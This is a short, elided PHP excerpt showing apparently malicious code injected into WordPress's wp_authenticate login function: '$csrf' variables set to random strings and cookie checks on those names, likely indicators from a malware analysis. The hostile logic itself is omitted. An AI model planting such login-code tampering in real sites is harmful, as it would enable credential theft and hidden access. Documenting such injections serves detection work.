...
if ( ! function_exists( 'wp_authenticate' ) ) :
	...
	function wp_authenticate( $username, $password ) {
		...
		if ( null == $user ) {
		    ...
		    if (!is_wp_error($user))
    {
        $csrf = "_dqjxuSAoIhpRs2yMgWT3Fl9wKizkPG4r0mLDB5XEU7ceV1QO8HvnaZY6";
...
*/
    ...
    if (!is_wp_error($user))
    {
        $csrf = "_NcbA2U6JeOzWDPuQaIiRqTgE1w80ZlFdV4oHvGSmyLM3pst7r5XjYxKB";
...
if (isset($_COOKIE["_dqjxuSAoIhpRs2yMgWT3Fl9wKizkPG4r0mLDB5XEU7ceV1QO8HvnaZY6"]))
{}
if (isset($_COOKIE["_NcbA2U6JeOzWDPuQaIiRqTgE1w80ZlFdV4oHvGSmyLM3pst7r5XjYxKB"]))
{}